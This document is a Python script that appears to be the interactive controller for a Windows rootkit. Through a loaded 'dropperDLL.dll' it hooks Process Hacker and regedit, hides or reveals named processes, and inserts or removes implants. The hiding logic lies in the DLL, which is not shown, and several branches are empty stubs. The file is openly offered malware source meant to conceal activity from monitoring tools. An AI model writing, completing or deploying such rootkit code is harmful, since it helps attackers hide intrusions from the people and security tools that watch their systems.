import ctypes
import ctypes.wintypes
import psutil

dropper_dll = ctypes.CDLL('./dropperDLL.dll')


def get_action():
    ret_val = 0

    params = input('Rootkit> ').split(' ')

    help_str = 'Help'

    if len(params) == 1:
        if params[0] == "help":
            print(help_str)
        elif params[0] == "exit":
            ret_val = 1
        else:
            print(help_str)
    elif len(params) == 2:
        if params[0] == 'hook':
            if params[1] == 'ph':
                dropper_dll.hook_ph()
            elif params[1] == 'regedit':
                ...
            else:
                print(help_str)
        elif params[0] == 'unhook':
            if params[1] == 'ph':
                dropper_dll.unhook_ph()
            elif params[1] == 'regedit':
                ...
            else:
                print(help_str)
        else:
            print(help_str)
    elif len(params) == 3:
        if params[0] == 'hide':
            if params[1] == 'process':
                proc_name = ctypes.create_string_buffer(20)
                proc_name.value = bytes(params[2], 'utf-8')
                dropper_dll.hide_process(proc_name)
            elif params[1] == 'key':
                ...
            else:
                print(help_str)
        elif params[0] == 'show':
            if params[1] == 'process':
                proc_name = ctypes.create_string_buffer(20)
                proc_name.value = bytes(params[2], 'utf-8')
                dropper_dll.show_process(proc_name)
            elif params[1] == 'key':
                ...
            else:
                print(help_str)
        elif params[0] == 'insert' and params[1] == 'implant':
            if params[2] == 'ph':
                dropper_dll.insert_ph_implant()
            elif params[2] == 'regedit':
                ...
            else:
                print(help_str)
        elif params[0] == 'remove' and params[1] == 'implant':
            if params[2] == 'ph':
                dropper_dll.remove_ph_implant()
            elif params[2] == 'regedit':
                ...
            else:
                print(help_str)
        else:
            print(help_str)
    else:
        print(help_str)

    return ret_val


def main():
    print('Welcome to Rootkit')

    while get_action() == 0:
        ...

    print('Bye bye')


if __name__ == '__main__':
    main()
